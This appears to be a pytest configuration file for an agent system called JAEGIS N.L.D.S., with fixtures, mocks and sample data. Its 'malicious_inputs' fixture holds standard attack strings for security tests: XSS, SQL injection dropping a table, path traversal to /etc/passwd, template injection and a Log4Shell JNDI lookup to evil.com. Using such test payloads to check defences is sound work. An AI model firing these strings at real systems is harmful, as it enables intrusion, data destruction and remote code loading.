"""
N.L.D.S. Testing Configuration
JAEGIS Enhanced Agent System v2.2 - Tier 0 Component

Pytest configuration and fixtures for comprehensive testing of the N.L.D.S. system.
"""

import pytest
import asyncio
import tempfile
import shutil
from typing import Dict, Any, Generator, AsyncGenerator
from unittest.mock import Mock, AsyncMock, patch
from datetime import datetime, timedelta
import json
import os
from pathlib import Path

# Import N.L.D.S. components
from nlds.processing import ProcessingOrchestrator
from nlds.analysis import AnalysisOrchestrator
from nlds.translation import TranslationOrchestrator
from nlds.integration import NLDSIntegrationOrchestrator, get_default_integration_config
from nlds.api import create_nlds_api, create_test_client
from nlds.api.auth import AuthenticationService, User, UserRole, Permission
from nlds.api.rate_limiting import RateLimitingEngine
from nlds.api.monitoring import create_monitoring_system


# ============================================================================
# PYTEST CONFIGURATION
# ============================================================================

def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line(
        "markers", "unit: mark test as a unit test"
    )
    config.addinivalue_line(
        "markers", "integration: mark test as an integration test"
    )
    config.addinivalue_line(
        "markers", "performance: mark test as a performance test"
    )
    config.addinivalue_line(
        "markers", "security: mark test as a security test"
    )
    config.addinivalue_line(
        "markers", "slow: mark test as slow running"
    )
    config.addinivalue_line(
        "markers", "api: mark test as API test"
    )
    config.addinivalue_line(
        "markers", "async_test: mark test as async test"
    )


def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers automatically."""
    for item in items:
        # Add async marker for async tests
        if asyncio.iscoroutinefunction(item.function):
            item.add_marker(pytest.mark.async_test)
        
        # Add markers based on test file location
        if "test_api" in str(item.fspath):
            item.add_marker(pytest.mark.api)
        elif "test_integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        elif "test_performance" in str(item.fspath):
            item.add_marker(pytest.mark.performance)
        elif "test_security" in str(item.fspath):
            item.add_marker(pytest.mark.security)
        else:
            item.add_marker(pytest.mark.unit)


# ============================================================================
# ASYNC TEST SUPPORT
# ============================================================================

@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


# ============================================================================
# TEMPORARY DIRECTORIES AND FILES
# ============================================================================

@pytest.fixture
def temp_dir():
    """Create temporary directory for tests."""
    temp_path = tempfile.mkdtemp()
    yield Path(temp_path)
    shutil.rmtree(temp_path, ignore_errors=True)


@pytest.fixture
def temp_file():
    """Create temporary file for tests."""
    fd, temp_path = tempfile.mkstemp()
    os.close(fd)
    yield Path(temp_path)
    try:
        os.unlink(temp_path)
    except FileNotFoundError:
        pass


@pytest.fixture
def sample_config():
    """Sample configuration for testing."""
    return {
        "processing": {
            "max_input_length": 10000,
            "timeout_seconds": 30,
            "confidence_threshold": 0.85
        },
        "analysis": {
            "logical_weight": 0.4,
            "emotional_weight": 0.3,
            "creative_weight": 0.3,
            "depth_levels": 5
        },
        "translation": {
            "mode_selection_threshold": 0.8,
            "squad_selection_threshold": 0.75,
            "confidence_validation_threshold": 0.85
        },
        "integration": get_default_integration_config(),
        "api": {
            "debug": True,
            "monitoring_enabled": False,
            "rate_limiting_enabled": False
        }
    }


# ============================================================================
# MOCK DATA FIXTURES
# ============================================================================

@pytest.fixture
def sample_input_text():
    """Sample input text for testing."""
    return "Analyze the current market trends for renewable energy and provide strategic recommendations for investment opportunities."


@pytest.fixture
def sample_enhanced_input():
    """Sample enhanced input text for testing."""
    return "Analyze the current market trends for renewable energy and provide strategic recommendations for investment opportunities [Context: 2025-07-26 12:00:00 UTC] [Domain Context: technology - Consider: frameworks, methodologies, tools] [System: JAEGIS v2.2 | N.L.D.S. Tier 0 | A.M.A.S.I.A.P. Active | Context: 0.8]"


@pytest.fixture
def sample_analysis_result():
    """Sample analysis result for testing."""
    return {
        "logical_analysis": {
            "requirements": ["Market analysis", "Investment recommendations"],
            "logical_structure": "Sequential analysis with recommendations",
            "confidence": 0.92
        },
        "emotional_analysis": {
            "sentiment": "neutral",
            "emotional_state": "analytical",
            "confidence": 0.88
        },
        "creative_analysis": {
            "patterns": ["Market trend analysis", "Strategic planning"],
            "innovation_potential": "high",
            "confidence": 0.85
        },
        "synthesis": {
            "overall_confidence": 0.88,
            "recommended_approach": "comprehensive",
            "key_insights": ["Market volatility", "Growth opportunities"]
        }
    }


@pytest.fixture
def sample_jaegis_command():
    """Sample JAEGIS command for testing."""
    return {
        "command_id": "cmd_test_001",
        "command_type": "analysis",
        "target_squad": "content_squad",
        "mode_level": 3,
        "parameters": [
            {
                "type": "text_input",
                "value": "Sample input text",
                "confidence": 0.95
            }
        ],
        "priority": "normal",
        "estimated_duration": 300
    }


@pytest.fixture
def sample_user():
    """Sample user for testing."""
    return User(
        user_id="test_user_001",
        username="test_user",
        email="test@example.com",
        role=UserRole.USER,
        permissions={Permission.READ, Permission.WRITE, Permission.PROCESS},
        is_active=True,
        is_verified=True,
        created_at=datetime.utcnow(),
        last_login=None,
        rate_limit=100,
        api_keys=["test_api_key_001"]
    )


@pytest.fixture
def sample_admin_user():
    """Sample admin user for testing."""
    return User(
        user_id="admin_user_001",
        username="admin",
        email="admin@example.com",
        role=UserRole.ADMIN,
        permissions={Permission.READ, Permission.WRITE, Permission.ADMIN, Permission.PROCESS},
        is_active=True,
        is_verified=True,
        created_at=datetime.utcnow(),
        last_login=None,
        rate_limit=0,  # Unlimited
        api_keys=["admin_api_key_001"]
    )


# ============================================================================
# COMPONENT FIXTURES
# ============================================================================

@pytest.fixture
def processing_orchestrator(sample_config):
    """Create processing orchestrator for testing."""
    return ProcessingOrchestrator(sample_config["processing"])


@pytest.fixture
def analysis_orchestrator(sample_config):
    """Create analysis orchestrator for testing."""
    return AnalysisOrchestrator(sample_config["analysis"])


@pytest.fixture
def translation_orchestrator(sample_config):
    """Create translation orchestrator for testing."""
    return TranslationOrchestrator(sample_config["translation"])


@pytest.fixture
async def integration_orchestrator(sample_config):
    """Create integration orchestrator for testing."""
    orchestrator = NLDSIntegrationOrchestrator(sample_config["integration"])
    
    # Mock the initialization to avoid external dependencies
    with patch.object(orchestrator, 'initialize_all_components', new_callable=AsyncMock) as mock_init:
        mock_init.return_value = True
        await orchestrator.initialize_all_components()
    
    yield orchestrator
    
    # Cleanup
    with patch.object(orchestrator, 'cleanup_all_components', new_callable=AsyncMock):
        await orchestrator.cleanup_all_components()


# ============================================================================
# API FIXTURES
# ============================================================================

@pytest.fixture
def test_app(sample_config):
    """Create test FastAPI application."""
    return create_nlds_api(sample_config["api"])


@pytest.fixture
def test_client(test_app):
    """Create test client for API testing."""
    return create_test_client()


@pytest.fixture
def auth_service():
    """Create authentication service for testing."""
    return AuthenticationService()


@pytest.fixture
def rate_limiter():
    """Create rate limiter for testing."""
    return RateLimitingEngine()


@pytest.fixture
def monitoring_system():
    """Create monitoring system for testing."""
    return create_monitoring_system()


# ============================================================================
# MOCK FIXTURES
# ============================================================================

@pytest.fixture
def mock_jaegis_interface():
    """Mock JAEGIS interface for testing."""
    mock = AsyncMock()
    mock.initialize_connection.return_value = True
    mock.submit_command.return_value = {
        "command_id": "test_cmd_001",
        "status": "submitted",
        "submission_time": datetime.utcnow()
    }
    mock.get_command_status.return_value = {
        "command_id": "test_cmd_001",
        "status": "completed",
        "progress_percentage": 100.0,
        "result_data": {"success": True}
    }
    return mock


@pytest.fixture
def mock_amasiap_engine():
    """Mock A.M.A.S.I.A.P. engine for testing."""
    mock = AsyncMock()
    mock.initialize_protocol.return_value = True
    mock.process_input.return_value = Mock(
        enhanced_input="Enhanced input text",
        enhancement_quality_score=0.95,
        research_relevance_score=0.88,
        overall_improvement_score=0.91
    )
    return mock


@pytest.fixture
def mock_openrouter_engine():
    """Mock OpenRouter engine for testing."""
    mock = AsyncMock()
    mock.initialize_integration.return_value = True
    mock.select_optimal_model.return_value = {
        "model_id": "test_model",
        "provider": "test_provider",
        "confidence": 0.9
    }
    mock.process_request.return_value = {
        "response": "Test response",
        "usage": {"tokens": 100},
        "cost": 0.01
    }
    return mock


@pytest.fixture
def mock_github_interface():
    """Mock GitHub interface for testing."""
    mock = AsyncMock()
    mock.initialize_integration.return_value = True
    mock.fetch_resource.return_value = {
        "content": "Test resource content",
        "last_modified": datetime.utcnow(),
        "cache_hit": False
    }
    mock.sync_resources.return_value = {
        "synced_count": 5,
        "updated_count": 2,
        "errors": []
    }
    return mock


# ============================================================================
# DATABASE FIXTURES
# ============================================================================

@pytest.fixture
def mock_database():
    """Mock database for testing."""
    mock_db = Mock()
    mock_db.connect.return_value = True
    mock_db.execute.return_value = Mock(rowcount=1)
    mock_db.fetch_one.return_value = {"id": 1, "name": "test"}
    mock_db.fetch_all.return_value = [{"id": 1, "name": "test"}]
    return mock_db


# ============================================================================
# NETWORK FIXTURES
# ============================================================================

@pytest.fixture
def mock_http_client():
    """Mock HTTP client for testing."""
    mock = AsyncMock()
    mock.get.return_value = Mock(
        status_code=200,
        json=lambda: {"success": True, "data": "test"},
        headers={"content-type": "application/json"}
    )
    mock.post.return_value = Mock(
        status_code=200,
        json=lambda: {"success": True, "id": "test_001"},
        headers={"content-type": "application/json"}
    )
    return mock


@pytest.fixture
def mock_websocket():
    """Mock WebSocket for testing."""
    mock = AsyncMock()
    mock.connect.return_value = True
    mock.send.return_value = None
    mock.receive.return_value = '{"type": "test", "data": "test_data"}'
    mock.close.return_value = None
    return mock


# ============================================================================
# PERFORMANCE FIXTURES
# ============================================================================

@pytest.fixture
def performance_timer():
    """Performance timer for testing."""
    import time
    
    class Timer:
        def __init__(self):
            self.start_time = None
            self.end_time = None
        
        def start(self):
            self.start_time = time.time()
        
        def stop(self):
            self.end_time = time.time()
        
        @property
        def elapsed_ms(self):
            if self.start_time and self.end_time:
                return (self.end_time - self.start_time) * 1000
            return 0
    
    return Timer()


# ============================================================================
# SECURITY FIXTURES
# ============================================================================

@pytest.fixture
def security_headers():
    """Security headers for testing."""
    return {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "X-XSS-Protection": "1; mode=block",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        "Content-Security-Policy": "default-src 'self'"
    }


@pytest.fixture
def malicious_inputs():
    """Malicious inputs for security testing."""
    return [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "<%=7*7%>",
        "${7*7}",
        "#{7*7}",
        "javascript:alert('xss')",
        "data:text/html,<script>alert('xss')</script>"
    ]


# ============================================================================
# UTILITY FIXTURES
# ============================================================================

@pytest.fixture
def assert_timing():
    """Assertion helper for timing tests."""
    def _assert_timing(func, max_time_ms=1000):
        import time
        start = time.time()
        result = func()
        elapsed_ms = (time.time() - start) * 1000
        assert elapsed_ms <= max_time_ms, f"Function took {elapsed_ms}ms, expected <= {max_time_ms}ms"
        return result
    return _assert_timing


@pytest.fixture
def assert_async_timing():
    """Assertion helper for async timing tests."""
    async def _assert_timing(coro, max_time_ms=1000):
        import time
        start = time.time()
        result = await coro
        elapsed_ms = (time.time() - start) * 1000
        assert elapsed_ms <= max_time_ms, f"Coroutine took {elapsed_ms}ms, expected <= {max_time_ms}ms"
        return result
    return _assert_timing


@pytest.fixture
def json_validator():
    """JSON schema validator for testing."""
    import jsonschema
    
    def _validate(data, schema):
        try:
            jsonschema.validate(data, schema)
            return True
        except jsonschema.ValidationError:
            return False
    
    return _validate


# ============================================================================
# CLEANUP FIXTURES
# ============================================================================

@pytest.fixture(autouse=True)
def cleanup_after_test():
    """Automatic cleanup after each test."""
    yield
    
    # Clear any global state
    # Reset singletons
    # Close connections
    # Clean up temporary files
    pass


@pytest.fixture(scope="session", autouse=True)
def cleanup_after_session():
    """Automatic cleanup after test session."""
    yield
    
    # Final cleanup
    # Close persistent connections
    # Clean up session-wide resources
    pass
